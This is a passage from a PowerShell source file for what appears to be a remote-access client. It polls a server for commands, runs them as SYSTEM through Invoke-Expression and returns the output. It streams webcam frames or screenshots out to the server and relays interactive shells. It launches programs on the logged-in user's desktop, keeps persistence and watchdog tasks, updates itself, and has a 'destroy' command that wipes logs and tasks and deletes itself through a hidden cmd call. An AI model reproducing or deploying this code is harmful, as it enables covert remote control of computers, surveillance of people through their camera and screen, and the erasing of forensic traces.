                                $bytes = [System.IO.File]::ReadAllBytes($tmpJpeg)
                                if ($bytes.Length -gt 500) { UploadFrame $bytes }
                            }
                        } catch {}
                        finally { try { Remove-Item $tmpJpeg -Force -ErrorAction SilentlyContinue } catch {} }
                        $i++
                        Start-Sleep -Milliseconds 1000  # 1 fps — halves CPU/battery/bandwidth
                    }
                } else { throw 'no video device found' }
            } catch {
                Report "[!] ffmpeg webcam failed: $($_.Exception.Message) -- falling back to screen capture`n"
                $usedFfmpeg = $false
            }
        }
        if (-not $usedFfmpeg) {
            $i = 0
            try {
                while ($sharedState.CameraRunning) {
                    try {
                        $bytes = ScreenshotJpeg
                        UploadFrame $bytes
                        $i++
                    } catch { break }
                    Start-Sleep -Milliseconds 1000  # 1 fps — halves CPU/battery/bandwidth
                }
            } catch {
                Report "[!] Screenshot stream failed: $($_.Exception.Message)`n"
            }
        }
    }) | Out-Null
    $script:cameraTask = $ps
    $ps.BeginInvoke() | Out-Null
    Write-Log 'Camera started in runspace' 'INFO'
}

function Stop-CameraStream {
    # Signal runspace to stop (normal user path)
    if ($script:sharedState) { $script:sharedState.CameraRunning = $false }
    Start-Sleep -Milliseconds 600
    if ($script:cameraTask) {
        try { $script:cameraTask.Stop() } catch {}
        try { $script:cameraTask.Dispose() } catch {}
        $script:cameraTask = $null
    }
    if ($script:cameraRunspace) {
        try { $script:cameraRunspace.Close() } catch {}
        try { $script:cameraRunspace.Dispose() } catch {}
        $script:cameraRunspace = $null
    }
    # Cleanup SYSTEM scheduled task (stream path)
    if ($script:cameraTaskId) {
        try { Stop-ScheduledTask -TaskName $script:cameraTaskId -ErrorAction SilentlyContinue } catch {}
        try { Unregister-ScheduledTask -TaskName $script:cameraTaskId -Confirm:$false -ErrorAction SilentlyContinue } catch {}
        $script:cameraTaskId = $null
    }
    if ($script:cameraScriptPath) {
        try { Remove-Item $script:cameraScriptPath -Force -ErrorAction SilentlyContinue } catch {}
        $script:cameraScriptPath = $null
    }
    if ($script:cameraErrLog) {
        try { Remove-Item $script:cameraErrLog -Force -ErrorAction SilentlyContinue } catch {}
        $script:cameraErrLog = $null
    }
    # Cleanup any in-flight one-shot capture task and its temp files
    if ($script:captureTaskId) {
        try { Stop-ScheduledTask -TaskName $script:captureTaskId -ErrorAction SilentlyContinue } catch {}
        try { Unregister-ScheduledTask -TaskName $script:captureTaskId -Confirm:$false -ErrorAction SilentlyContinue } catch {}
        $script:captureTaskId = $null
    }
    if ($script:captureScriptPath) { try { Remove-Item $script:captureScriptPath -Force -ErrorAction SilentlyContinue } catch {}; $script:captureScriptPath = $null }
    if ($script:captureOutPath)    { try { Remove-Item $script:captureOutPath    -Force -ErrorAction SilentlyContinue } catch {}; $script:captureOutPath    = $null }
    if ($script:captureErrPath)    { try { Remove-Item $script:captureErrPath    -Force -ErrorAction SilentlyContinue } catch {}; $script:captureErrPath    = $null }
    # Nuke any stray wildcard matches from previous crashes
    try { Get-ScheduledTask -TaskName 'CameraCapture_*' -ErrorAction SilentlyContinue | ForEach-Object {
        try { Stop-ScheduledTask -TaskName $_.TaskName -ErrorAction SilentlyContinue } catch {}
        try { Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue } catch {}
    } } catch {}
    try { Get-ScheduledTask -TaskName 'Capture_*' -ErrorAction SilentlyContinue | ForEach-Object {
        try { Stop-ScheduledTask -TaskName $_.TaskName -ErrorAction SilentlyContinue } catch {}
        try { Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue } catch {}
    } } catch {}
    try { Get-ChildItem $env:TEMP -Filter 'cam_*.ps1'     -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue } catch {}
    try { Get-ChildItem $env:TEMP -Filter 'cam_err_*.txt' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue } catch {}
    try { Get-ChildItem $env:TEMP -Filter 'cap_*.ps1'     -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue } catch {}
    try { Get-ChildItem $env:TEMP -Filter 'cap_out_*.jpg' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue } catch {}
    try { Get-ChildItem $env:TEMP -Filter 'cap_err_*.txt' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue } catch {}
    Write-Log 'Camera/Capture stopped and cleaned up' 'INFO'
}

# Crash/kill trap — runs when the script exits unexpectedly
trap {
    try { Stop-CameraStream } catch {}
    break
}

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  PERSISTENT RUNSPACE                                                       ║
# ║  Keeps a single PowerShell runspace alive across commands so state (cd,    ║
# ║  variables, modules) persists between commands.                            ║
# ║  Do NOT remove — required by STREAMING EXECUTION.                         ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
$script:persistentRunspace = $null

function Get-PersistentRunspace {
    if ($null -eq $script:persistentRunspace -or $script:persistentRunspace.RunspaceStateInfo.State -ne 'Opened') {
        try { if ($script:persistentRunspace) { $script:persistentRunspace.Dispose() } } catch {}
        $script:persistentRunspace = [runspacefactory]::CreateRunspace()
        $script:persistentRunspace.Open()
        Write-Log "Created new persistent runspace"
    }
    return $script:persistentRunspace
}

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  INTERACTIVE PROCESS EXECUTION                                               ║
# ║  Runs truly interactive binaries (cmd/python/etc.) with redirected stdin/   ║
# ║  stdout/stderr. stdin is pulled from /stdin and streamed to the process.    ║
# ║  Supports timeout + cancel exactly like normal command execution.            ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
function Invoke-InteractiveCommand {
    param(
        [string]$Command,
        [bool]$NoTimeout = $false,
        [int]$Timeout = $cmdTimeout
    )

    $timeoutLabel = if ($NoTimeout) { "no-timeout" } else { "${Timeout}s" }
    $runspace = Get-PersistentRunspace
    try {
        $cwdPs = [powershell]::Create()
        $cwdPs.Runspace = $runspace
        $cwdValues = $cwdPs.AddScript('(Get-Location).Path').Invoke() | ForEach-Object { $_.ToString() }
        $cwdPs.Dispose()
        $cwd = if ($cwdValues) { @($cwdValues)[0] } else { (Get-Location).Path }
    } catch { $cwd = (Get-Location).Path }

    Send-Stream-To-Server -Body "PS $cwd> $Command [$timeoutLabel] [interactive]`n"

    $parts = $Command.Trim() -split '\s+', 2
    $exe = $parts[0]
    $args = if ($parts.Count -gt 1) { $parts[1] } else { "" }

    # Resolve full path so SYSTEM account finds user-installed binaries
    try {
        $resolved = (Get-Command $exe -ErrorAction Stop).Source
        if ($resolved) { $exe = $resolved }
    } catch {
        # Fallback: check known install dirs (no recursive scan)
        $knownPaths = @(
            "$env:SystemRoot\System32\$exe.exe",
            "$env:ProgramFiles\$exe\$exe.exe",
            "${env:ProgramFiles(x86)}\$exe\$exe.exe",
            "$env:LOCALAPPDATA\Programs\Python\Python*\$exe.exe",
            "$env:ProgramFiles\Python*\$exe.exe",
            "$env:ProgramFiles\nodejs\$exe.exe"
        )
        foreach ($pattern in $knownPaths) {
            $match = Get-Item -Path $pattern -ErrorAction SilentlyContinue | Select-Object -First 1
            if ($match) { $exe = $match.FullName; break }
        }
    }

    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $exe
    $psi.Arguments = $args
    $psi.WorkingDirectory = $cwd
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true
    $psi.RedirectStandardInput = $true
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true

    $proc = New-Object System.Diagnostics.Process
    $proc.StartInfo = $psi

    $streamQueue = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()

    try {
        if (-not $proc.Start()) {
            Send-Result-To-Server -Body "[!] Failed to start interactive command: $Command`n"
            return
        }
    } catch {
        Send-Result-To-Server -Body ("[!] Failed to start interactive command: " + $_.Exception.Message + "`n")
        return
    }

    $outEvent = Register-ObjectEvent -InputObject $proc -EventName OutputDataReceived -MessageData $streamQueue -Action {
        if ($EventArgs.Data -ne $null) { $Event.MessageData.Enqueue($EventArgs.Data + "`n") }
    }
    $errEvent = Register-ObjectEvent -InputObject $proc -EventName ErrorDataReceived -MessageData $streamQueue -Action {
        if ($EventArgs.Data -ne $null) { $Event.MessageData.Enqueue($EventArgs.Data + "`n") }
    }
    $proc.BeginOutputReadLine()
    $proc.BeginErrorReadLine()

    Send-Interactive-Flag -IsInteractive $true

    $startTime = Get-Date
    $idleCycles = 0
    $cancelled = $false
    $timedOut = $false
    $pollFailures = 0
    $maxPollFailures = 15  # abort interactive session after this many transport failures

    while (-not $proc.HasExited) {
        $chunk = ""
        $line = $null
        while ($streamQueue.TryDequeue([ref]$line)) {
            $chunk += $line
        }
        if ($chunk.Length -gt 0) {
            Send-Stream-To-Server -Body $chunk
            $idleCycles = 0
        } else {
            $idleCycles++
        }

        $stdinData = Get-Stdin-From-Server
        if ($stdinData -eq "") {
            # Could be empty response or transport failure — both return ""
        } elseif ($stdinData) {
            $pollFailures = 0  # successful poll
            foreach ($stdinLine in ($stdinData -split "`n")) {
                $cleanLine = $stdinLine.TrimEnd("`r")
                try { $proc.StandardInput.WriteLine($cleanLine) } catch {}
            }
            try { $proc.StandardInput.Flush() } catch {}
        }

        $signal = Get-Signal-From-Server
        if ($signal -eq "cancel") {
            try { if (-not $proc.HasExited) { $proc.Kill() } } catch {}
            $cancelled = $true
            break
        }
        if ($signal -ne "") {
            $pollFailures = 0
        }

        if (-not $NoTimeout) {
            $elapsed = ((Get-Date) - $startTime).TotalSeconds
            if ($elapsed -gt $Timeout) {
                try { if (-not $proc.HasExited) { $proc.Kill() } } catch {}
                $timedOut = $true
                break
            }
        }

        $sleepMs = if ($idleCycles -le 0) { 200 } elseif ($idleCycles -le 5) { 500 } else { 1000 }
        Start-Sleep -Milliseconds $sleepMs
    }

    try { $proc.WaitForExit(1000) | Out-Null } catch {}

    $finalChunk = ""
    $line = $null
    while ($streamQueue.TryDequeue([ref]$line)) {
        $finalChunk += $line
    }

    if ($cancelled) {
        Send-Result-To-Server -Body ($finalChunk + "[!] Command cancelled by operator.`n")
        Write-Log "Interactive command cancelled: $Command" "INFO"
    } elseif ($timedOut) {
        Send-Result-To-Server -Body ($finalChunk + "[!] Command timed out after ${Timeout}s.`n")
        Write-Log "Interactive command timed out: $Command" "WARN"
    } else {
        Send-Result-To-Server -Body $finalChunk
    }

    try { $proc.CancelOutputRead() } catch {}
    try { $proc.CancelErrorRead() } catch {}
    try { Unregister-Event -SourceIdentifier $outEvent.Name -ErrorAction SilentlyContinue } catch {}
    try { Unregister-Event -SourceIdentifier $errEvent.Name -ErrorAction SilentlyContinue } catch {}
    try { Remove-Job -Id $outEvent.Id -Force -ErrorAction SilentlyContinue } catch {}
    try { Remove-Job -Id $errEvent.Id -Force -ErrorAction SilentlyContinue } catch {}
    try { $proc.StandardInput.Close() } catch {}
    try { $proc.Dispose() } catch {}
}

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  STREAMING EXECUTION                                                       ║
# ║  Runs commands asynchronously with real-time output streaming back to      ║
# ║  the server. Supports: timeout, notimeout: prefix, cancel signal.         ║
# ║  Do NOT remove — this is the core command execution engine.               ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
function Invoke-CommandStreaming {
    param([string]$Command, [int]$Timeout = $cmdTimeout)

    # --- notimeout: prefix support (removable) ---
    $noTimeout = $false
    if ($Command -match '^notimeout:(.+)$') {
        $Command = $Matches[1].Trim()
        $noTimeout = $true
    }
    # --- end notimeout ---

    # --- GUI PROCESS LAUNCH (removable) ---
    # SYSTEM runs in Session 0 (no desktop). The gui: prefix creates a
    # temporary scheduled task that runs as the logged-in user on their
    # visible desktop. Usage: gui:explorer .   gui:notepad   gui:code .
    # To remove: delete this block. No other code depends on it.
    if ($Command -match '^gui:(.+)$') {
        $guiCmd = $Matches[1].Trim()
        $taskId = "GUI_$(Get-Random)"
        try {
            # Find logged-on user (CIM preferred, WMI fallback)
            $loggedOnUser = $null
            try {
                $loggedOnUser = (Get-CimInstance Win32_ComputerSystem -ErrorAction Stop).UserName
            } catch {
                try { $loggedOnUser = (Get-WmiObject Win32_ComputerSystem -ErrorAction Stop).UserName } catch {}
            }
            if (-not $loggedOnUser) {
                Send-Result-To-Server -Body "[!] Cannot launch GUI: no user logged on.`n"
                Write-Log "GUI launch failed: no user logged on" "WARN"
                return
            }

            # Get working directory from persistent runspace
            $guiCwd = $null
            try {
                $cwdPs = [powershell]::Create()
                $cwdPs.Runspace = (Get-PersistentRunspace)
                $guiCwd = $cwdPs.AddScript('(Get-Location).Path').Invoke() | ForEach-Object { $_.ToString() }
                $cwdPs.Dispose()
            } catch {}
            if (-not $guiCwd) { $guiCwd = "C:\" }

            # Parse command into executable + arguments
            $guiParts = $guiCmd -split '\s+', 2
            $guiExe  = $guiParts[0]
            $guiArgs = if ($guiParts.Count -gt 1) { $guiParts[1] } else { $null }

            # Resolve executable path — SYSTEM doesn't have user PATH,
            # so also search common user-profile install locations
            $resolved = $null
            try { $resolved = (Get-Command $guiExe -ErrorAction Stop).Source } catch {}
            if (-not $resolved) {
                $userOnly = ($loggedOnUser -split '\\')[-1]
                $searchPaths = @(
                    "C:\Users\$userOnly\AppData\Local\Programs\Microsoft VS Code\bin\code.cmd",
                    "C:\Users\$userOnly\AppData\Local\Programs\Microsoft VS Code\Code.exe",
                    "C:\Program Files\Microsoft VS Code\bin\code.cmd",
                    "C:\Program Files\Microsoft VS Code\Code.exe",
                    "C:\Users\$userOnly\AppData\Local\Programs\Sublime Text\sublime_text.exe",
                    "C:\Program Files\Sublime Text\sublime_text.exe",
                    "C:\Users\$userOnly\AppData\Local\Programs\cursor\Cursor.exe"
                )
                foreach ($p in $searchPaths) {
                    if ($p -like "*\$($guiExe)*" -or $p -like "*\$($guiExe).*") {
                        if (Test-Path $p) { $resolved = $p; break }
                    }
                }
            }
            if ($resolved) { $guiExe = $resolved }

            $guiAction = if ($guiArgs) {
                New-ScheduledTaskAction -Execute $guiExe -Argument $guiArgs -WorkingDirectory $guiCwd
            } else {
                New-ScheduledTaskAction -Execute $guiExe -WorkingDirectory $guiCwd
            }
            $guiPrincipal = New-ScheduledTaskPrincipal -UserId $loggedOnUser -LogonType Interactive
            $guiSettings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

            Register-ScheduledTask -TaskName $taskId -Action $guiAction -Principal $guiPrincipal -Settings $guiSettings -Force | Out-Null
            Start-ScheduledTask -TaskName $taskId
            Start-Sleep -Seconds 3

            # Check task result — only flag genuine errors
            # GUI apps routinely return non-zero (explorer=1, etc.)
            $taskInfo = Get-ScheduledTaskInfo -TaskName $taskId -ErrorAction SilentlyContinue
            $lastResult = if ($taskInfo) { $taskInfo.LastTaskResult } else { -1 }

            Unregister-ScheduledTask -TaskName $taskId -Confirm:$false -ErrorAction SilentlyContinue

            # Only these codes mean a real failure
            $knownErrors = @{
                2147942402 = "File not found (0x80070002)"
                2147942405 = "Access denied (0x80070005)"
                2147942667 = "Directory not found (0x8007010B)"
                2147943645 = "Program not installed (0x800700DD)"
            }
            if ($knownErrors.ContainsKey($lastResult)) {
                $errMsg = $knownErrors[$lastResult]
                Send-Result-To-Server -Body "[!] GUI failed: $errMsg`n    Command: $guiCmd`n    Resolved exe: $guiExe`n    CWD: $guiCwd`n    User: $loggedOnUser`n"
                Write-Log "GUI launch failed: $guiCmd ($errMsg)" "WARN"
            } else {
                Send-Result-To-Server -Body "[+] GUI launched on $loggedOnUser's desktop: $guiCmd`n    Exe: $guiExe | CWD: $guiCwd`n"
                Write-Log "GUI launched: $guiCmd as $loggedOnUser" "INFO"
            }
        } catch {
            Send-Result-To-Server -Body "[!] GUI launch failed: $($_.Exception.Message)`n"
            Write-Log "GUI launch error: $($_.Exception.Message)" "WARN"
            try { Unregister-ScheduledTask -TaskName $taskId -Confirm:$false -ErrorAction SilentlyContinue } catch {}
        }
        return
    }
    # --- end gui launch ---

    # --- INTERACTIVE COMMAND DETECTION (routes to Invoke-InteractiveCommand) ---
    $interactiveList = @('cmd', 'cmd.exe', 'powershell', 'powershell.exe', 'pwsh', 'pwsh.exe',
                         'python', 'python3', 'python.exe', 'node', 'node.exe',
                         'nslookup', 'ftp', 'telnet', 'wsl', 'bash',
                         'diskpart', 'debug', 'edit', 'edlin')
    $firstToken = ($Command.Trim() -split '\s+', 2)[0].ToLower()
    $hasArgs = ($Command.Trim() -split '\s+').Count -gt 1
    if ($interactiveList -contains $firstToken -and -not $hasArgs) {
        Invoke-InteractiveCommand -Command $Command -NoTimeout $noTimeout -Timeout $Timeout
        return
    }
    # --- end interactive detection ---

    # --- SESSION-0 GUI BLOCKER (removable) ---
    # SYSTEM runs in Session 0 (no desktop). Cmdlets that open GUI windows will
    # block indefinitely until the 300s timeout fires. Detect and reject them.
    $guiBlockList = @('out-gridview', 'show-command', 'show-controlpanelitem')
    $cmdLower = $Command.ToLower()
    foreach ($blocked in $guiBlockList) {
        if ($cmdLower -match "\b$([regex]::Escape($blocked))\b") {
            Send-Result-To-Server -Body "[!] '$blocked' opens a GUI window and cannot run in Session 0 (SYSTEM has no desktop).`n    Use 'gui:' prefix to run commands on the logged-in user's desktop instead.`n"
            return
        }
    }
    # --- end session-0 gui blocker ---

    # 1) Send header — read cwd from persistent runspace (reflects cd changes)
    $timeoutLabel = if ($noTimeout) { "no-timeout" } else { "${Timeout}s" }
    $runspace = Get-PersistentRunspace
    try {
        $cwdPs = [powershell]::Create()
        $cwdPs.Runspace = $runspace
        $cwdValues = $cwdPs.AddScript('(Get-Location).Path').Invoke() | ForEach-Object { $_.ToString() }
        $cwdPs.Dispose()
        $cwd = if ($cwdValues) { @($cwdValues)[0] } else { (Get-Location).Path }
    } catch { $cwd = (Get-Location).Path }
    $header = "PS $cwd> $Command [$timeoutLabel]`n"
    Send-Stream-To-Server -Body $header

    # 2) Use persistent runspace (reused across commands)
    $ps = [powershell]::Create()
    $ps.Runspace = $runspace

    $ps.AddScript(@"
        try {
            Invoke-Expression `$args[0] 2>&1 | Out-String -Stream
        } catch {
            "Error: " + `$_.Exception.Message
        }
"@).AddArgument($Command) | Out-Null

    $outputCollection = [System.Management.Automation.PSDataCollection[PSObject]]::new()
    $inputCollection = [System.Management.Automation.PSDataCollection[PSObject]]::new()
    $inputCollection.Complete()

    $handle = $ps.BeginInvoke($inputCollection, $outputCollection)

    $lastIndex = 0
    $startTime = Get-Date
    $finished = $false
    $idleCycles = 0

    # 3) Adaptive streaming loop — drain output + check cancel/timeout
    while (-not $handle.IsCompleted) {
        $sleepMs = if ($idleCycles -le 0) { 200 } elseif ($idleCycles -le 5) { 500 } else { 1000 }
        Start-Sleep -Milliseconds $sleepMs

        # Drain new output lines
        $currentCount = $outputCollection.Count
        if ($currentCount -gt $lastIndex) {
            $idleCycles = 0
            $chunk = ""
            for ($i = $lastIndex; $i -lt $currentCount; $i++) {
                $chunk += [string]$outputCollection[$i] + "`n"
            }
            $lastIndex = $currentCount
            if ($chunk.Length -gt 0) {
                Send-Stream-To-Server -Body $chunk
            }
        } else {
            $idleCycles++
        }

        # --- TIMEOUT CHECK (removable — commands will run indefinitely) ---
        if (-not $noTimeout) {
            $elapsed = ((Get-Date) - $startTime).TotalSeconds
            if ($elapsed -gt $Timeout) {
                $ps.Stop()
                Send-Result-To-Server -Body "[!] Command timed out after ${Timeout}s.`n"
                Write-Log "Command timed out: $Command" "WARN"
                $finished = $true
                break
            }
        }
        # --- end timeout check ---

        # --- CANCEL SIGNAL CHECK (removable — operator won't be able to cancel) ---
        $signal = Get-Signal-From-Server
        if ($signal -eq "cancel") {
            $ps.Stop()
            Send-Result-To-Server -Body "[!] Command cancelled by operator.`n"
            Write-Log "Command cancelled: $Command" "INFO"
            $finished = $true
            break
        }
        # --- end cancel signal ---
    }

    # 4) Drain remaining output and send as final result
    if (-not $finished) {
        $currentCount = $outputCollection.Count
        $chunk = ""
        if ($currentCount -gt $lastIndex) {
            for ($i = $lastIndex; $i -lt $currentCount; $i++) {
                $chunk += [string]$outputCollection[$i] + "`n"
            }
        }
        Send-Result-To-Server -Body $chunk
    }

    # 5) Cleanup (only dispose the PowerShell instance, NOT the shared runspace)
    try { $ps.Dispose() } catch {}
}

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  MAIN LOOP                                                                ║
# ║  Long-polls the server for commands (/cmd holds ~30s until one arrives).  ║
# ║  Zero idle CPU/network — server does the waiting, not the client.         ║
# ║  Exponential backoff on error. Self-kill after 5 min continuous failure.  ║
# ║  Do NOT remove — this is the entry point.                                 ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
function Connect-Cloudflare {
    $activeDelay   = 300
    $consecutiveIdle = 0
    $failingSince  = $null    # timestamp of first consecutive failure
    $selfKillMins  = 30       # kill self after this many minutes of non-stop failure
                              # (was 5 — ride out tunnel/network outages instead of
                              #  restart-churning every 5 min; backoff keeps retrying
                              #  and the server clears stale state on reconnect)

    Write-Log "Client v$Version started. PID=$PID. Connecting to $cfHost"

    while ($true) {
        try {
            $command = Get-Command-From-Server
            $failingSince = $null  # connection succeeded — reset failure timer

            if ($command -and $command -ne "") {
                $retryCount = 0
                $consecutiveIdle = 0

                Write-Log "CMD: $command"

                if ($command -eq "exit") {
                    Write-Log "Exit command received. Full cleanup."
                    # Remove persistence tasks so watchdog doesn't revive
                    try { Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue } catch {}
                    try { Unregister-ScheduledTask -TaskName $watchdogTaskName -Confirm:$false -ErrorAction SilentlyContinue } catch {}
                    # Remove script and log file
                    try { Remove-Item $selfPath -Force -ErrorAction SilentlyContinue } catch {}
                    try { Remove-Item $logFile -Force -ErrorAction SilentlyContinue } catch {}
                    # Restore power policy
                    try {
                        powercfg /setacvalueindex SCHEME_CURRENT SUB_BUTTONS LIDACTION 1 2>$null
                        powercfg /setdcvalueindex SCHEME_CURRENT SUB_BUTTONS LIDACTION 1 2>$null
                        powercfg /change standby-timeout-ac 30 2>$null
                        powercfg /setactive SCHEME_CURRENT 2>$null
                    } catch {}
                    # Cleanup any leftover tasks and temp files
                    try { Stop-CameraStream } catch {}
                    try {
                        Get-ScheduledTask -TaskName "GUI_*" -ErrorAction SilentlyContinue | ForEach-Object {
                            Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
                        }
                    } catch {}
                    try {
                        Get-ScheduledTask -TaskName "CameraCapture_*" -ErrorAction SilentlyContinue | ForEach-Object {
                            try { Stop-ScheduledTask  -TaskName $_.TaskName -ErrorAction SilentlyContinue } catch {}
                            Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
                        }
                    } catch {}
                    try {
                        Get-ChildItem $env:TEMP -Filter 'cam_*.ps1'      -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
                        Get-ChildItem $env:TEMP -Filter 'cam_err_*.txt'   -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
                        Get-ChildItem $env:TEMP -Filter 'cap_*.ps1'       -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
                        Get-ChildItem $env:TEMP -Filter 'cap_out_*.jpg'   -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
                        Get-ChildItem $env:TEMP -Filter 'cap_err_*.txt'   -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
                    } catch {}
                    try {
                        Get-ScheduledTask -TaskName "Capture_*" -ErrorAction SilentlyContinue | ForEach-Object {
                            try { Stop-ScheduledTask  -TaskName $_.TaskName -ErrorAction SilentlyContinue } catch {}
                            Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
                        }
                    } catch {}
                    # Release mutex and stop
                    try { $script:singleInstanceMutex.ReleaseMutex() } catch {}
                    try { $script:singleInstanceMutex.Dispose() } catch {}
                    Send-Result-To-Server -Body "[+] Full cleanup complete. Client removed.`n"
                    break
                }

                if ($command -eq "destroy") {
                    Write-Log "DESTROY command received. Wiping all traces." "WARN"
                    # Ack first — script may die before next send
                    Send-Result-To-Server -Body "[+] Destroying... all traces being removed.`n"

                    # 1) Unregister persistence tasks
                    try { Unregister-ScheduledTask -TaskName $taskName          -Confirm:$false -ErrorAction SilentlyContinue } catch {}
                    try { Unregister-ScheduledTask -TaskName $watchdogTaskName  -Confirm:$false -ErrorAction SilentlyContinue } catch {}
                    # 2) Stop stream + unregister all spawned tasks + wipe temp files
                    try { Stop-CameraStream } catch {}
                    try {
                        Get-ScheduledTask -TaskName "GUI_*" -ErrorAction SilentlyContinue | ForEach-Object {
                            Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
                        }
                    } catch {}
                    try {
                        Get-ChildItem $env:TEMP -Filter 'cam_*.ps1'      -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
                        Get-ChildItem $env:TEMP -Filter 'cam_err_*.txt'  -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
                        Get-ChildItem $env:TEMP -Filter 'cap_*.ps1'      -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
                        Get-ChildItem $env:TEMP -Filter 'cap_out_*.jpg'  -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
                        Get-ChildItem $env:TEMP -Filter 'cap_err_*.txt'  -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
                    } catch {}
                    try {
                        Get-ScheduledTask -TaskName "CameraCapture_*" -ErrorAction SilentlyContinue | ForEach-Object {
                            try { Stop-ScheduledTask  -TaskName $_.TaskName -ErrorAction SilentlyContinue } catch {}
                            Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
                        }
                    } catch {}
                    try {
                        Get-ScheduledTask -TaskName "Capture_*" -ErrorAction SilentlyContinue | ForEach-Object {
                            try { Stop-ScheduledTask  -TaskName $_.TaskName -ErrorAction SilentlyContinue } catch {}
                            Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
                        }
                    } catch {}
                    # 3) Restore power policy
                    try {
                        powercfg /setacvalueindex SCHEME_CURRENT SUB_BUTTONS LIDACTION 1 2>$null
                        powercfg /setdcvalueindex SCHEME_CURRENT SUB_BUTTONS LIDACTION 1 2>$null
                        powercfg /change standby-timeout-ac 30 2>$null
                        powercfg /setactive SCHEME_CURRENT 2>$null
                    } catch {}
                    # 4) Delete log file and old log
                    try { Remove-Item $logFile          -Force -ErrorAction SilentlyContinue } catch {}
                    try { Remove-Item "$logFile.old"    -Force -ErrorAction SilentlyContinue } catch {}
                    # 5) Release mutex
                    try { $script:singleInstanceMutex.ReleaseMutex() } catch {}
                    try { $script:singleInstanceMutex.Dispose()       } catch {}
                    # 6) Delete self — schedule via cmd so the delete fires after this process exits
                    $targetPath = $selfPath
                    $deleteCmd  = "ping -n 3 127.0.0.1 >nul & del /f /q `"$targetPath`""
                    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $deleteCmd" -WindowStyle Hidden -ErrorAction SilentlyContinue
                    # 7) Kill self immediately
                    Stop-Process -Id $PID -Force
                    break
                }

                if ($command -eq "update") {
                    Send-Stream-To-Server -Body "[*] Checking for updates from GitHub...`n"
                    Write-Log "Manual update triggered by operator"
                    if (Update-Self) {
                        Send-Result-To-Server -Body "[+] Updated to new version! Restarting via watchdog in ~1 min...`n"
                        exit
                    } else {
                        Send-Result-To-Server -Body "[*] Already running latest version (v$Version).`n"
                    }
                    Start-Sleep -Milliseconds $activeDelay
                    continue
                }

                if ($command -eq "version") {
                    $info = "[*] Client Version: v$Version`n"
                    $info += "    Host: $env:COMPUTERNAME`n"
                    $info += "    User: $env:USERNAME`n"
                    $info += "    PID: $PID`n"
                    $info += "    Path: $selfPath`n"
                    Send-Result-To-Server -Body $info
                    Start-Sleep -Milliseconds $activeDelay
                    continue
                }

                if ($command -eq "stream") {
                    if ($script:cameraTask -or $script:cameraTaskId) {
                        Send-Result-To-Server -Body "[!] Camera stream already running`n"
                    } else {
                        Stop-CameraStream  # cleanup any leftover state
                        $viewUrl = "$cfHost/camera_view?id=$clientId"
                        Send-Stream-To-Server -Body "[*] Camera stream starting...`n[*] View at: $viewUrl`n"
                        Start-CameraStream
                    }
                    continue
                }

                if ($command -eq "stopstream") {
                    Stop-CameraStream
                    Send-Result-To-Server -Body "[*] Camera stream stopped`n"
                    Start-Sleep -Milliseconds $activeDelay
                    continue
                }

                if ($command -eq "capture") {
                    try {
                        $isSystem     = ([Security.Principal.WindowsIdentity]::GetCurrent()).IsSystem
                        $loggedOnUser = $null
                        try { $loggedOnUser = (Get-CimInstance Win32_ComputerSystem -ErrorAction Stop).UserName } catch {
                            try { $loggedOnUser = (Get-WmiObject Win32_ComputerSystem -ErrorAction Stop).UserName } catch {}
                        }

                        if ($isSystem -and $loggedOnUser) {
                            # --- SYSTEM path: one-shot scheduled task runs as logged-on user ---
                            # Pre-clean stale residue from interrupted older captures
                            try {
                                Get-ScheduledTask -TaskName "Capture_*" -ErrorAction SilentlyContinue | ForEach-Object {
                                    try { Stop-ScheduledTask -TaskName $_.TaskName -ErrorAction SilentlyContinue } catch {}
                                    try { Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue } catch {}
                                }
                            } catch {}
                            try {
                                Get-ChildItem $env:TEMP -Filter 'cap_*.ps1' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
